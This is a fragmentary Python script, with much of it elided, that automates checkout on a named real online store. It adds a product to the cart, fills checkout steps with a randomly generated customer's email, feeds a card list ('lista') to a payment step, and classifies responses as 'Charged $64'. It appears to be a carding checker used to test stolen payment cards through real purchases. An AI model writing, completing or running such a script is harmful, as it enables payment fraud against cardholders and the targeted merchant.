...
def one(r):
    a = r.get('https://www.everau.com.au/collections/accessories/products/knight-bus')
    b_data = {
'form_type': 'product',
'utf8': '✓',
'id': '39557201920160',
...
'size': 'EUFREE',
'quantity': '1',
'option-globo-0': 'White',
'option-globo-1': 'EUFREE',
}

    b = r.post('https://www.everau.com.au/cart/add.js', data = b_data, headers = {'x-requested-with': 'XMLHttpRequest'})
...
'checkout': '',
    ...
    d = r.post('https://www.everau.com.au/cart', d_post)
...
'checkout[email_or_phone]': rand_user.email, #'vkgfbfbftj@metalunits.com',
...
'step': 'payment_method',
'checkout[shipping_rate][id]': 'shopify-International%20Post-35.00',
...
def three(r, payment_gateway, lista, rand_user,auth_token, url):
    ...
    "payment_session_scope": "www.everau.com.au"
}
...
def get_response_shf(text):
    if 'Thank you' in text or 'Your order is confirmed' in text:
        r_text, r_logo, r_respo = "Charged $64", "✅", 'Charged'
